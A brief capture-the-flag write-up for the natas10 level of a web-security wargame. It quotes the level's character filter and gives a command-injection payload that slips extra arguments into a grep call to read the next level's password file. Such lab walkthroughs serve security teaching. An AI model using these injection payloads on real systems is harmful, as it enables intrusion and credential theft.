# natas10

## Analysis

This level is the same as natas9, except we cannot use the characters `;|&`:
```
if(preg_match('/[;|&]/',$key)) {
    print "Input contains an illegal character!";
}
```

Happily one of our natas9 solutions still works: `".*" /etc/natas_webpass/natas11 #` gets us the password.


